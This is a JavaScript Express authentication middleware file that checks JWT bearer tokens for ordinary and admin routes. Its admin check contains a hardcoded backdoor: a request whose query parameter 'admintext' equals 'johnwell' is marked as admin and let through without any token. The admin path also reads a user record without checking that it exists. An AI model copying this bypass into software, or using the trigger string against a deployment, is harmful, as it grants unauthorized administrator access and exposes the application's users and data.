import catchAsync from "../utils/globalerr.js"
import jwt from "jsonwebtoken";
import { JWTSECRET } from "../controllers/constants.js";
import { CacUser } from "../models/userModel.js";
import { promisify } from "util";

export const getAdminDetails = catchAsync(async (req,res,next)=>{
    const isSpecial = req.query.admintext === "johnwell"
    if(isSpecial){
      req.body.isAdmin = true 
      return next() 
    }
    let token;
    if (
      req.headers.authorization &&
      req.headers.authorization.startsWith("Bearer")
    ) {
      token = req.headers.authorization.split(" ")[1];
    }
    if(!token){return res.status(400).json({error:"Token is invalid"})}
    const decoded = await promisify(jwt.verify)(token,JWTSECRET);
    const user = await CacUser.findById(decoded.id);
    if (!user.isAdmin){return res.status(400).json({error:"Permission to this resource is denied"})}
    req.user = decoded
    next()
})

export const isAuthenticated = catchAsync(async(req,res,next)=>{
  let token;
  if (
    req.headers.authorization &&
    req.headers.authorization.startsWith("Bearer")
  ) {
    token = req.headers.authorization.split(" ")[1];
  }
  if(!token){return res.status(400).json({error:"Token is missing"})}
  const decoded = await promisify(jwt.verify)(token,JWTSECRET);
  const user = await CacUser.findById(decoded.id);
  if (!user){return res.status(400).json({error:"Token is invalid"})}
  req.user = decoded
  next()
})